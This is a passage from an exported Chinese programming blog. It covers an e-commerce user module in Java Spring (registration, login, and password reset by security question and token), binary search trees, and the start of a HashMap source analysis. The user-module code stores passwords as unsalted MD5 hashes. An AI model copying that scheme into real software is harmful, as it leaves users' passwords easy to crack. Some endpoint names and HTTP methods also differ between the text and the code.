user.setRole(Constants.Role.ROLE_CUSTOMER); //MD5加密 user.setPassword(MD5Util.MD5EncodeUtf8(user.getPassword())); int resultCount = userMapper.insert(user); if(resultCount == 0)&#123; return ServerResponse.createByErrorMessage("注册失败"); &#125; return ServerResponse.createBySuccessMessage("注册成功");&#125; 这里设置默认角色用到一个轻量的常量类型： 1234public interface Role&#123; int ROLE_CUSTOMER = 0;//普通用户 int ROLE_ADMIN = 1;//管理员&#125; 先判断注册输入的用户名是否已经存在，然后再判断邮箱是否已经存在。这里复用了用户校验的一个方法： 1/check_valid.do?str=admin&amp;type=username就是检查用户名 request12str,typestr可以是用户名也可以是email。对应的type是username和email fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;用户已存在&quot;&#125; success1234&#123; &quot;status&quot;: 0, &quot;msg&quot;: &quot;校验成功&quot;&#125; 1234567891011121314151617181920public ServerResponse&lt;String&gt; checkValid(String str,String type)&#123; if(StringUtils.isNotBlank(type))&#123; if (Constants.USERNAME.equals(type))&#123; int resultCount = userMapper.checkUsername(str); if(resultCount &gt; 0)&#123; return ServerResponse.createByErrorMessage("用户名已存在"); &#125; &#125; if(Constants.EMAIL.equals(type))&#123; int resultCount = userMapper.checkEmail(str); if(resultCount &gt; 0)&#123; return ServerResponse.createByErrorMessage("邮箱已存在"); &#125; &#125; &#125;else &#123; return ServerResponse.createByErrorMessage("参数错误"); &#125; return ServerResponse.createBySuccessMessage("校验成功");&#125; 这里用到常量类： 12public static final String EMAIL = "email";public static final String USERNAME = "username"; 这里还直接封装为一个api: 1检验用户是否有效：/user/check_valid.do 对应的controller: 12345@RequestMapping(value = "check_valid.do",method = RequestMethod.GET)@ResponseBodypublic ServerResponse&lt;String&gt; checkValid(String str,String type)&#123; return userService.checkValid(str,type);&#125; 3、门户用户登出request1无 fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;服务端异常&quot;&#125; success1234&#123; &quot;status&quot;: 0, &quot;msg&quot;: &quot;退出成功&quot;&#125; 123456@RequestMapping(value = "logout.do",method = RequestMethod.GET)@ResponseBodypublic ServerResponse&lt;String&gt; logout(HttpSession session)&#123; session.removeAttribute(Constants.CURRENT_USER); return ServerResponse.createBySuccess();&#125; 4.获取登录用户信息 /user/get_user_info.dorequest1无参 fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;用户未登录,无法获取当前用户信息&quot;&#125; success123456789101112&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;id&quot;: 12, &quot;username&quot;: &quot;aaa&quot;, &quot;email&quot;: &quot;aaa@163.com&quot;, &quot;phone&quot;: null, &quot;role&quot;: 0, &quot;createTime&quot;: 1479048325000, &quot;updateTime&quot;: 1479048325000 &#125;&#125; controller层的方法：123456789@RequestMapping(value = "get_user_info.do",method = RequestMethod.POST)@ResponseBodypublic ServerResponse&lt;User&gt; getUserInfo(HttpSession session)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user!=null)&#123; return ServerResponse.createBySuccess(user); &#125; return ServerResponse.createByErrorMessage("用户未登陆，无法获取当前用户的信息");&#125; 5.忘记密码 /user/forget_get_question.dorequest12localhost:8080/user/forget_get_question.do?username=geely参数：username fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;该用户未设置找回密码问题&quot;&#125; sucess1234&#123; &quot;status&quot;: 0, &quot;data&quot;: &quot;这里是问题&quot;&#125; 问题的controller:12345@RequestMapping(value = "forget_get_question.do",method = RequestMethod.POST)@ResponseBodypublic ServerResponse forgetGetQuestion(String username)&#123; return userService.selectQuestion(username);&#125; 对应的service是:123456789101112public ServerResponse selectQuestion(String username)&#123; ServerResponse validReponse = checkValid(username,Constants.USERNAME); if(validReponse.isSuccess())&#123; return ServerResponse.createByErrorMessage(&quot;用户不存在&quot;); &#125; //SELECT question from mmall_user where username = #&#123;username&#125; String question = userMapper.selectQuestionByUsername(username); if(StringUtils.isNotBlank(question))&#123; return ServerResponse.createBySuccess(question); &#125; return ServerResponse.createByErrorMessage(&quot;找回密码的问题是空的&quot;);&#125; 6.提交问题答案 /user/forget_check_answer.dorequest1username,question,answer fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;问题答案错误&quot;&#125; success1234&#123; &quot;status&quot;: 0, &quot;data&quot;: &quot;531ef4b4-9663-4e6d-9a20-fb56367446a5&quot;&#125; 这个api的主要功能是判断回答是否正确，正确的话返回token。 12345@RequestMapping(value = "forget_check_answer.do",method = RequestMethod.POST)@ResponseBodypublic ServerResponse&lt;String&gt; forgetCheckAnswer(String username,String question,String answer)&#123; return userService.checkAnswer(username,question,answer);&#125; 对应点service是：12345678910public ServerResponse&lt;String&gt; checkAnswer(String username,String question,String answer)&#123; int resultCount = userMapper.checkAnswer(username,question,answer); if(resultCount &gt; 0)&#123; //说明问题及答案都是正确的，都是对应到这个用户的 String forgetToken = UUID.randomUUID().toString(); TokenCache.setKey(TokenCache.TOKEN_PREFIX+username,forgetToken); return ServerResponse.createBySuccess(forgetToken); &#125; return ServerResponse.createByErrorMessage("问题的答案错误");&#125; 这里将token值放入一个缓存中，设置过期时间。 12345678910111213141516171819202122232425262728293031323334public class TokenCache &#123; private static Logger logger = LoggerFactory.getLogger(TokenCache.class); public static final String TOKEN_PREFIX = "token_"; //LRU算法 private static LoadingCache&lt;String,String&gt; localCache = CacheBuilder.newBuilder().initialCapacity(1000).maximumSize(10000).expireAfterAccess(12, TimeUnit.HOURS) .build(new CacheLoader&lt;String, String&gt;() &#123; //默认的数据加载实现,当调用get取值的时候,如果key没有对应的值,就调用这个方法进行加载. @Override public String load(String s) throws Exception &#123; return "null"; &#125; &#125;); public static void setKey(String key,String value)&#123; localCache.put(key,value); &#125; public static String getKey(String key)&#123; String value = null; try &#123; value = localCache.get(key); if("null".equals(value))&#123; return null; &#125; return value; &#125;catch (Exception e)&#123; logger.error("localCache get error",e); &#125; return null; &#125;&#125; 7.忘记密码的重设密码 /user/forget_reset_password.dorequest1username,passwordNew,forgetToken fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;修改密码操作失效&quot;&#125; success1234&#123; &quot;status&quot;: 0, &quot;msg&quot;: &quot;修改密码成功&quot;&#125; 检查答案是否正确的controller: 12345@RequestMapping(value = "forget_reset_password.do",method = RequestMethod.POST)@ResponseBodypublic ServerResponse&lt;String&gt; forgetRestPassword(String username,String passwordNew,String forgetToken)&#123; return userService.forgetRestPassword(username,passwordNew,forgetToken);&#125; 对应的service是：123456789101112131415161718192021222324252627public ServerResponse&lt;String&gt; forgetRestPassword(String username,String passwordNew,String forgetToken)&#123; //1、校验参数是否为空 if(StringUtils.isBlank(forgetToken))&#123; return ServerResponse.createByErrorMessage(&quot;参数错误，token需要传递&quot;); &#125; //2、校验username ServerResponse validReponse = checkValid(username,Constants.USERNAME); if(validReponse.isSuccess())&#123; return ServerResponse.createByErrorMessage(&quot;用户不存在&quot;); &#125; //3、获取token String token = TokenCache.getKey(TokenCache.TOKEN_PREFIX+username); if(StringUtils.isBlank(token))&#123; return ServerResponse.createByErrorMessage(&quot;token无效或者过期&quot;); &#125; //4、判断token是否一致 if(StringUtils.equals(token,forgetToken))&#123; String md5Password = MD5Util.MD5EncodeUtf8(passwordNew); int resultCount = userMapper.updatePasswordByUsername(username,md5Password); if(resultCount&gt;0)&#123; return ServerResponse.createBySuccessMessage(&quot;修改密码成功&quot;); &#125; &#125;else &#123; return ServerResponse.createByErrorMessage(&quot;token错误，请重新获取&quot;); &#125; return ServerResponse.createByErrorMessage(&quot;修改密码失败&quot;);&#125; 8.登录中状态重置密码 /user/reset_password.dorequest1passwordOld,passwordNew fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;旧密码输入错误&quot;&#125; success1234&#123; &quot;status&quot;: 0, &quot;msg&quot;: &quot;修改密码成功&quot;&#125; controller: 123456789@RequestMapping(value = "reset_password.do",method = RequestMethod.POST)@ResponseBodypublic ServerResponse&lt;String&gt; resetPassword(HttpSession session,String passwordOld,String passwordNew)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user==null)&#123; return ServerResponse.createByErrorMessage("用户未登陆"); &#125; return userService.resetPassword(passwordOld,passwordNew,user);&#125; 对应的service是：123456789101112public ServerResponse&lt;String&gt; resetPassword(String passwordOld, String passwordNew,User user)&#123; int resultCount = userMapper.checkPassword(MD5Util.MD5EncodeUtf8(passwordOld),user.getId()); if(resultCount==0)&#123; return ServerResponse.createByErrorMessage(&quot;旧密码错误&quot;); &#125; user.setPassword(MD5Util.MD5EncodeUtf8(passwordNew)); int updateResult = userMapper.updateByPrimaryKeySelective(user); if(updateResult&gt;0)&#123; return ServerResponse.createBySuccessMessage(&quot;更新密码成功&quot;); &#125; return ServerResponse.createByErrorMessage(&quot;更新密码失败&quot;);&#125; 9.登录状态更新个人信息 /user/update_information.dorequest1email,phone,question,answer fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;用户未登录&quot;&#125; success1234&#123; &quot;status&quot;: 0, &quot;msg&quot;: &quot;更新个人信息成功&quot;&#125; controller：123456789101112131415@RequestMapping(value = "update_information.do",method = RequestMethod.POST)@ResponseBodypublic ServerResponse&lt;User&gt; update_information(HttpSession session,User user)&#123; User currentUser = (User)session.getAttribute(Constants.CURRENT_USER); if(currentUser==null)&#123; return ServerResponse.createByErrorMessage("用户未登陆"); &#125; user.setId(currentUser.getId()); user.setUsername(currentUser.getUsername()); ServerResponse&lt;User&gt; response = userService.updateInfo(user); if(response.isSuccess())&#123; session.setAttribute(Constants.CURRENT_USER,response.getData()); &#125; return response;&#125; 对应service：1234567891011121314151617public ServerResponse&lt;User&gt; updateInfo(User user)&#123; int resulCount = userMapper.checkEmailByUserId(user.getEmail(),user.getId()); if(resulCount&gt;0)&#123; return ServerResponse.createByErrorMessage("email已经存在，请更换email，再尝试更新"); &#125; User updateUser = new User(); updateUser.setId(user.getId()); updateUser.setEmail(user.getEmail()); updateUser.setPhone(user.getPhone()); updateUser.setQuestion(user.getQuestion()); updateUser.setAnswer(user.getAnswer()); int updateCount = userMapper.updateByPrimaryKeySelective(updateUser); if(updateCount &gt; 0)&#123; return ServerResponse.createBySuccess("更新信息成功",updateUser); &#125; return ServerResponse.createByErrorMessage("更新信息失败");&#125; 在更新邮箱的时候，要先判断邮箱是否被其他用户使用了。 10.获取当前登录用户的详细信息，并强制登录 /user/get_information.dorequest1无参 fail1234&#123; &quot;status&quot;: 10, &quot;msg&quot;: &quot;用户未登录,无法获取当前用户信息,status=10,强制登录&quot;&#125; success123456789101112131415&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;id&quot;: 1, &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;&quot;, &quot;email&quot;: &quot;admin@163.com&quot;, &quot;phone&quot;: &quot;13800138000&quot;, &quot;question&quot;: &quot;question&quot;, &quot;answer&quot;: &quot;answer&quot;, &quot;role&quot;: 1, &quot;createTime&quot;: 1478422605000, &quot;updateTime&quot;: 1491305256000 &#125;&#125; controller：123456789@RequestMapping(value = "get_infomation.do",method = RequestMethod.POST)@ResponseBodypublic ServerResponse&lt;User&gt; get_infomation(HttpSession session)&#123; User currentUser = (User)session.getAttribute(Constants.CURRENT_USER); if(currentUser==null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return userService.getInfomation(currentUser.getId());&#125; 对应的service:12345678public ServerResponse&lt;User&gt; getInfomation(Integer userId)&#123; User user = userMapper.selectByPrimaryKey(userId); if(user==null)&#123; return ServerResponse.createByErrorMessage("找不到当前用户"); &#125; user.setPassword(StringUtils.EMPTY); return ServerResponse.createBySuccess(user);&#125; 11.后台管理员登录request12String username,String password fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;密码错误&quot;&#125; success123456789101112&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;id&quot;: 12, &quot;username&quot;: &quot;aaa&quot;, &quot;email&quot;: &quot;aaa@163.com&quot;, &quot;phone&quot;: null, &quot;role&quot;: 0, &quot;createTime&quot;: 1479048325000, &quot;updateTime&quot;: 1479048325000 &#125;&#125; controller:12345678910111213141516171819202122@Controller@RequestMapping("/manage/user/")public class UserManageController &#123; @Autowired private UserService userService; @RequestMapping(value = "login.do",method = RequestMethod.POST) @ResponseBody public ServerResponse&lt;User&gt; login(String username, String password, HttpSession session)&#123; ServerResponse&lt;User&gt; response = userService.login(username,password); if(response.isSuccess())&#123; User user = response.getData(); if(user.getRole() == Constants.Role.ROLE_ADMIN)&#123; session.setAttribute(Constants.CURRENT_USER,user); return response; &#125;else &#123; return ServerResponse.createByErrorMessage("不是管理员，无法登陆"); &#125; &#125; return response; &#125;&#125;]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[6、二分搜索树（上）]]></title>
    <url>%2F2018%2F07%2F21%2F6%E3%80%81%E4%BA%8C%E5%88%86%E6%90%9C%E7%B4%A2%E6%A0%91%EF%BC%88%E4%B8%8A%EF%BC%89%2F</url>
    <content type="text"><![CDATA[二分搜索树（上） 一、二分查找算法思想： 注意该算法的前提条件：有序数组。例如下图，想查找元素value，先查看数组中间元素值v与value的大小，若相等则刚好，否则根据比较结果选择左、右半部分再次寻找。 时间复杂度： 整个查找过程可构成一棵树，时间复杂度为O(logn)。 代码实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public class BinarySearch &#123; /* * arr:数组 * n:数组数据长度 * target:就是要查找的被返回的值 * while循环迭代的方式实现二分查找 */ public static int binarySearch(int arr[], int n, int target)&#123; // 在arr[l...r]之中查找target int lo = 0, hi = n-1; while( lo &lt;= hi )&#123; //int mid = (l + r)/2;防止极端情况下的整形溢出，使用下面的逻辑求出mid int mid = lo + (hi-lo)/2; if( arr[mid] == target ) return mid; if( arr[mid] &gt; target ) hi = mid - 1; else lo = mid + 1; &#125; return -1; &#125; /* * 递归的方式实现二分查找 */ public static int binarySearch2(int arr[], int lo, int hi, int target)&#123; if( lo &gt; hi ) return -1; int mid = lo + (hi-lo)/2; if( arr[mid] == target ) return mid; else if( arr[mid] &gt; target ) return binarySearch2(arr, lo, mid-1, target); else return binarySearch2(arr, mid+1, hi, target); &#125; public static void main(String[] args) &#123; int[] arr = &#123;1,2,3,4,5,6&#125;; System.out.println(binarySearch(arr,arr.length,7)); System.out.println(binarySearch2(arr, 0, arr.length-1,5)); &#125;&#125; 二、二分搜索树1、特点： 二分搜索树本质上是一棵二叉树。不需要是一棵完全二叉树。 每个节点的键值大于左孩子 每个节点的键值小于右孩子 以左右孩子为根的子树仍为二分搜索树 2、Node节点定义、成员以及一些公共的方法12345678910111213141516171819202122232425262728293031323334353637383940//二分搜索树//由于Key需要能够进行比较，所以需要extends Comparable&lt;Key&gt;public class BST&lt;Key extends Comparable&lt;Key&gt;, Value&gt; &#123; // 树中的节点为私有的类, 外界不需要了解二分搜索树节点的具体实现 private class Node &#123; private Key key; private Value value; private Node left, right; public Node(Key key, Value value) &#123; this.key = key; this.value = value; left = right = null; &#125; &#125; private Node root; // 根节点 private int count; // 树种的节点个数 // 构造函数, 默认构造一棵空二分搜索树 public BST() &#123; root = null; count = 0; &#125; // 返回二分搜索树的节点个数 public int size() &#123; return count; &#125; // 返回二分搜索树是否为空 public boolean isEmpty() &#123; return count == 0; &#125; public static void main(String[] args) &#123; &#125;&#125; 3、插入新节点查看以下动画演示了解插入新节点的算法思想：（其插入过程充分利用了二分搜索树的特性） 例如待插入数据60，首先与根元素41比较，大于根元素，则与其右孩子再进行比较，大于58由于58无右孩子，则60为58的右孩子，过程结束。（注意其递归过程） 判断node节点是否为空，为空则创建节点并将其返回（ 判断递归到底的情况）。 若不为空，则继续判断根元素的key值是否等于根元素的key值：若相等则直接更新value值即可。若不相等，则根据其大小比较在左孩子或右孩子部分继续递归直至找到合适位置为止。、 代码实现(递归实现) 1234567891011121314151617181920212223242526272829// 向二分搜索树中插入一个新的(key, value)数据对// 返回的是最后插入完成之后二叉树的根public void insert(Key key, Value value)&#123; root = insert(root, key, value);&#125;//********************//* 二分搜索树的辅助函数//********************// 向以node为根的二分搜索树中, 插入节点(key, value), 使用递归算法// 返回插入新节点后的二分搜索树的根private Node insert(Node node, Key key, Value value)&#123; if( node == null )&#123; count ++; return new Node(key, value); &#125; if( key.compareTo(node.key) == 0 ) node.value = value; else if( key.compareTo(node.key) &lt; 0 ) node.left = insert( node.left , key, value); else // key &gt; node-&gt;key node.right = insert( node.right, key, value); return node;&#125; 4、二分搜索树的查找123456789101112131415161718192021222324252627282930313233343536373839// 查看二分搜索树中是否存在键keypublic boolean contain(Key key)&#123; return contain(root, key);&#125;// 在二分搜索树中搜索键key所对应的值。如果这个值不存在, 则返回nullpublic Value search(Key key)&#123; return search( root , key );&#125;// 查看以node为根的二分搜索树中是否包含键值为key的节点, 使用递归算法private boolean contain(Node node, Key key)&#123; if( node == null ) return false; if( key.compareTo(node.key) == 0 ) return true; else if( key.compareTo(node.key) &lt; 0 ) return contain( node.left , key ); else // key &gt; node-&gt;key return contain( node.right , key );&#125;// 在以node为根的二分搜索树中查找key所对应的value, 递归算法// 若value不存在, 则返回NULLprivate Value search(Node node, Key key)&#123; if( node == null ) return null; if( key.compareTo(node.key) == 0 ) return node.value; else if( key.compareTo(node.key) &lt; 0 ) return search( node.left , key ); else // key &gt; node-&gt;key return search( node.right, key );&#125; 5、二分搜索树的遍历遍历分为前序遍历、中序遍历以及后序遍历三种，如何理解其遍历顺序呢？ 对于每个节点而言，可能会有左、右两个孩子，所以分成下图中3个点，每次递归过程中会经过这3个点。 前序遍历：先访问当前节点，再依次递归访问左右子树 中序遍历：先递归访问左子树，再访问自身，再递归访问右子树 后续遍历：先递归访问左右子树，再访问自身节点 下面分别来看看是如何遍历的。 5.1 前序遍历 我们注意看，先找到28的第一个点，然后将28返回，下面看有没有左儿子，有就先来到左儿子的节点，然后将16弹出… 最终的打印结果: 5.2 中序遍历 最终的打印结果: 5.3 后序遍历 最终打印结果： 5.4 代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344// 二分搜索树的前序遍历public void preOrder()&#123; preOrder(root);&#125;// 二分搜索树的中序遍历public void inOrder()&#123; inOrder(root);&#125;// 二分搜索树的后序遍历public void postOrder()&#123; postOrder(root);&#125;// 对以node为根的二叉搜索树进行前序遍历, 递归算法private void preOrder(Node node)&#123; if( node != null )&#123; System.out.println(node.key); preOrder(node.left); preOrder(node.right); &#125;&#125;// 对以node为根的二叉搜索树进行中序遍历, 递归算法private void inOrder(Node node)&#123; if( node != null )&#123; inOrder(node.left); System.out.println(node.key); inOrder(node.right); &#125;&#125;// 对以node为根的二叉搜索树进行后序遍历, 递归算法private void postOrder(Node node)&#123; if( node != null )&#123; postOrder(node.left); postOrder(node.right); System.out.println(node.key); &#125;&#125;]]></content>
      <tags>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[6、HashMap源码分析]]></title>
    <url>%2F2018%2F07%2F21%2F6%E3%80%81HashMap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[本文分析HashMap源码。 1. 前言之前的List，讲了ArrayList、LinkedList，最后讲到了CopyOnWriteArrayList，就前两者而言，反映的是两种思想： （1）ArrayList以数组形式实现，顺序插入、查找快，插入、删除较慢 （2）LinkedList以链表形式实现，顺序插入、查找较慢，插入、删除方便 那么是否有一种数据结构能够结合上面两种的优点呢？有，答案就是HashMap。 HashMap是一种非常常见、方便和有用的集合，是一种键值对（K-V）形式的存储结构，在有了HashCode的基础后，下面将还是用图示的方式解读HashMap的实现原理。 Java为数据结构中的映射定义了一个接口java.util.Map，此接口主要有四个常用的实现类，分别是HashMap、Hashtable、LinkedHashMap和TreeMap，类继承关系如下图所示： (1) HashMap：它根据键的hashCode值存储数据，大多数情况下可以直接定位到它的值，因而具有很快的访问速度，但遍历顺序却是不确定的。 HashMap最多只允许一条记录的键为null，允许多条记录的值为null。HashMap非线程安全，即任一时刻可以有多个线程同时写HashMap，可能会导致数据的不一致。如果需要满足线程安全，可以用 Collections的synchronizedMap方法使HashMap具有线程安全的能力，或者使用ConcurrentHashMap。 (2) Hashtable：Hashtable是遗留类，很多映射的常用功能与HashMap类似，不同的是它承自Dictionary类，并且是线程安全的，任一时间只有一个线程能写Hashtable，并发性不如ConcurrentHashMap，因为ConcurrentHashMap引入了分段锁。Hashtable不建议在新代码中使用，不需要线程安全的场合可以用HashMap替换，需要线程安全的场合可以用ConcurrentHashMap替换。 (3) LinkedHashMap：LinkedHashMap是HashMap的一个子类，保存了记录的插入顺序，在用Iterator遍历LinkedHashMap时，先得到的记录肯定是先插入的，也可以在构造时带参数，按照访问次序排序。 (4) TreeMap：TreeMap实现SortedMap接口，能够把它保存的记录根据键排序，默认是按键值的升序排序，也可以指定排序的比较器，当用Iterator遍历TreeMap时，得到的记录是排过序的。如果使用排序的映射，建议使用TreeMap。在使用TreeMap时，key必须实现Comparable接口或者在构造TreeMap传入自定义的Comparator，否则会在运行时抛出java.lang.ClassCastException类型的异常。 对于上述四种Map类型的类，要求映射中的key是不可变对象。不可变对象是该对象在创建后它的哈希值不会被改变。如果对象的哈希值发生变化，Map对象很可能就定位不到映射的位置了。 2. 关注的几个问题 关注点 结论 HashMap是否允许空 Key和Value都允许为空 HashMap是否允许重复数据 Key重复会覆盖、Value允许重复 HashMap是否有序 无序，特别说明这个无序指的是遍历HashMap的时候，得到的元素的顺序基本不可能是put的顺序 HashMap是否线程安全 非线程安全 3. HashMap的结构HashMap 的大致结构如下图所示。 其中哈希表是一个数组，我们经常把数组中的每一个节点称为一个桶，哈希表中的每个节点都用来存储一个键值对。 在插入元素时，如果发生冲突（即多个键值对映射到同一个桶上）的话，就会通过链表的形式来解决冲突。 因为一个桶上可能存在多个键值对，所以在查找的时候，会先通过key的哈希值先定位到桶，再遍历桶上的所有键值对，找出key相等的键值对，从而来获取value。 4. 继承关系12public class HashMap&lt;K,V&gt; extends AbstractMap&lt;K,V&gt; implements Map&lt;K,V&gt;, Cloneable, Serializable 说明： HashMap继承自AbstractMap，AbstractMap是Map接口的骨干实现，AbstractMap中实现了Map中最重要最常用和方法，这样HashMap继承AbstractMap就不需要实现Map的所有方法，让HashMap减少了大量的工作。 5. 属性123456789101112131415161718192021222324252627//默认的初始容量为16static final int DEFAULT_INITIAL_CAPACITY = 1 &lt;&lt; 4; // aka 16//最大的容量上限为2^30static final int MAXIMUM_CAPACITY = 1 &lt;&lt; 30;//默认的负载因子为0.75static final float DEFAULT_LOAD_FACTOR = 0.75f;//变成树型结构的临界值为8static final int TREEIFY_THRESHOLD = 8;//恢复链式结构的临界值为6static final int UNTREEIFY_THRESHOLD = 6;/** * 哈希表的最小树形化容量 * 当哈希表中的容量大于这个值时，表中的桶才能进行树形化 * 否则桶内元素太多时会扩容，而不是树形化 * 为了避免进行扩容、树形化选择的冲突，这个值不能小于 4 * TREEIFY_THRESHOLD */static final int MIN_TREEIFY_CAPACITY = 64;//哈希表transient Node&lt;K,V&gt;[] table;//哈希表中键值对的个数transient int size;//哈希表被修改的次数transient int modCount;//它是通过capacity*load factor计算出来的，当size到达这个值时，就会进行扩容操作int threshold;//负载因子final float loadFactor; 5.1 Node结构1234567891011121314static class Node&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; &#123; final int hash; //用来定位数组索引位置 final K key; V value; Node&lt;K,V&gt; next; //链表的下一个node Node(int hash, K key, V value, Node&lt;K,V&gt; next) &#123; ... &#125; public final K getKey()&#123; ... &#125; public final V getValue() &#123; ... &#125; public final String toString() &#123; ... &#125; public final int hashCode() &#123; ... &#125; public final V setValue(V newValue) &#123; ... &#125; public final boolean equals(Object o) &#123; ... &#125;&#125; Node是HashMap的一个内部类，实现了Map.Entry接口，本质是就是一个映射(键值对)。上图中的每个黑色圆点就是一个Node对象。 例如程序执行下面代码： 1map.put("美团","小美"); 系统将调用”美团”这个key的hashCode()方法得到其hashCode值（该方法适用于每个Java对象），然后再通过Hash算法的后两步运算（高位运算和取模运算，下文有介绍）来定位该键值对的存储位置，有时两个key会定位到相同的位置，表示发生了Hash碰撞。当然Hash算法计算结果越分散均匀，Hash碰撞的概率就越小，map的存取效率就会越高。 如果哈希桶数组很大，即使较差的Hash算法也会比较分散，如果哈希桶数组数组很小，即使好的Hash算法也会出现较多碰撞，所以就需要在空间成本和时间成本之间权衡，其实就是在根据实际情况确定哈希桶数组的大小，并在此基础上设计好的hash算法减少Hash碰撞。那么通过什么方式来控制map使得Hash碰撞的概率又小，哈希桶数组（Node[] table）占用空间又少呢？答案就是好的Hash算法和扩容机制。 5.2 几个属性的详细说明1234int threshold; // 所能容纳的key-value对极限 final float loadFactor; // 负载因子int modCount; int size; 首先，Node[] table的初始化长度length(默认值是16)，Load factor为负载因子(默认值是0.75)，threshold是HashMap所能容纳的最大数据量的Node(键值对)个数。threshold = length * Load factor。也就是说，在数组定义好长度之后，负载因子越大，所能容纳的键值对个数越多。 结合负载因子的定义公式可知，threshold就是在此Load factor和length(数组长度)对应下允许的最大元素数目，超过这个数目就重新resize(扩容)，扩容后的HashMap容量是之前容量的两倍。默认的负载因子0.75是对空间和时间效率的一个平衡选择，建议大家不要修改，除非在时间和空间比较特殊的情况下，如果内存空间很多而又对时间效率要求很高，可以降低负载因子Load factor的值；相反，如果内存空间紧张而对时间效率要求不高，可以增加负载因子loadFactor的值，这个值可以大于1。 size这个字段其实很好理解，就是HashMap中实际存在的键值对数量。注意size和table的长度length、容纳最大键值对数量threshold的区别。而modCount字段主要用来记录HashMap内部结构发生变化的次数，主要用于迭代的快速失败。强调一点，内部结构发生变化指的是结构发生变化，例如put新键值对，但是某个key对应的value值被覆盖不属于结构变化。 在HashMap中，哈希桶数组table的长度length大小必须为2的n次方(一定是合数)，这是一种非常规的设计，常规的设计是把桶的大小设计为素数。相对来说素数导致冲突的概率要小于合数，具体证明可以参考http://blog.csdn.net/liuqiyao_01/article/details/14475159，`Hashtable`初始化桶大小为11，就是桶大小设计为素数的应用（Hashtable扩容后不能保证还是素数）。**`HashMap`采用这种非常规设计，主要是为了在取模和扩容时做优化，同时为了减少冲突，`HashMap`定位哈希桶索引位置时，也加入了高位参与运算的过程。** 这里存在一个问题，即使负载因子和Hash算法设计的再合理，也免不了会出现拉链过长的情况，一旦出现拉链过长，则会严重影响HashMap的性能。于是，在JDK1.8版本中，对数据结构做了进一步的优化，引入了红黑树。而当链表长度太长（默认超过8）时，链表就转换为红黑树，利用红黑树快速增删改查的特点提高HashMap的性能，其中会用到红黑树的插入、删除、查找等算法。 这里着重提一下MIN_TREEIFY_CAPACITY字段，容易与TREEIFY_THRESHOLD打架，TREEIFY_THRESHOLD是指桶中元素达到8个，就将其本来的链表结构改为红黑树，提高查询的效率。MIN_TREEIFY_CAPACITY是指最小树化的哈希表元素个数，也就是说，小于这个值，就算你(数组)桶里的元素数量大于8了，还是要用链表存储，只有同时满足：表中数据容量已经扩容到MIN_TREEIFY_CAPACITY这个长度，并且桶里的数据个数达到8个的时候，才会将该桶里的结构进行树化。注意扩容是数组的复制。 6. 方法6.1 get方法123456789101112131415161718192021222324252627282930//get方法主要调用的是getNode方法，所以重点要看getNode方法的实现public V get(Object key) &#123; Node&lt;K,V&gt; e; return (e = getNode(hash(key), key)) == null ? null : e.value;&#125;final Node&lt;K,V&gt; getNode(int hash, Object key) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; int n; K k; //如果哈希表不为空 &amp;&amp; key对应的桶上不为空 if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp; (first = tab[(n - 1) &amp; hash]) != null) &#123; //是否直接命中 if (first.hash == hash &amp;&amp; // always check first node ((k = first.key) == key || (key != null &amp;&amp; key.equals(k)))) return first; //判断是否有后续节点 if ((e = first.next) != null) &#123; //如果当前的桶是采用红黑树处理冲突，则调用红黑树的get方法去获取节点 if (first instanceof TreeNode) return ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key); //不是红黑树的话，那就是传统的链式结构了，通过循环的方法判断链中是否存在该key do &#123; if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) return e; &#125; while ((e = e.next) != null); &#125; &#125; return null;&#125; 实现步骤大致如下： 1、通过hash值获取该key映射到的桶。 2、桶上的key就是要查找的key，则直接命中。 3、桶上的key不是要查找的key，则查看后续节点： （1）如果后续节点是树节点，通过调用树的方法查找该key。 （2）如果后续节点是链式节点，则通过循环遍历链查找该key。 6.2 put方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960//put方法的具体实现也是在putVal方法中，所以我们重点看下面的putVal方法public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true);&#125;final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; //如果哈希表为空，则先创建一个哈希表 if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length; //如果当前桶没有碰撞冲突，则直接把键值对插入，完事 if ((p = tab[i = (n - 1) &amp; hash]) == null) tab[i] = newNode(hash, key, value, null); else &#123; Node&lt;K,V&gt; e; K k; //如果桶上节点的key与当前key重复，那你就是我要找的节点了 if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) e = p; //如果是采用红黑树的方式处理冲突，则通过红黑树的putTreeVal方法去插入这个键值对 else if (p instanceof TreeNode) e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value); //否则就是传统的链式结构 